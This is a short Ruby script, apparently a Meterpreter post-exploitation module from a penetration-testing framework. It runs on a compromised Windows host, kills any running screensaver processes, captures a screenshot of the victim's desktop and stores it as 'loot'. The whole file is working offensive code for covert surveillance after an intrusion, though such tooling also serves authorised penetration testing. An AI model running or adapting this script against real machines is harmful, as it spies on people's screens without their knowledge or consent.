##
# $Id$
##

if (client.sys.config.sysinfo["OS"] =~ /win/i)

	client.sys.process.get_processes().each do |x|
		if x['name'].downcase =~ /\.scr$/
			print_status("Trying to stop screensaver process with name: #{x['name']}...")
			client.sys.process.kill(x['pid']) rescue nil
		end
	end		

	data = client.ui.screenshot
	print_status("Got screenshot: #{data.length} bytes")
	pro.store_loot("host.windows.screenshot", "image/jpeg", client, data, "screenshot.jpg", "Windows Desktop Screenshot") if data
else
	print_status("Screenshots are not supported on non-Windows systems")
end


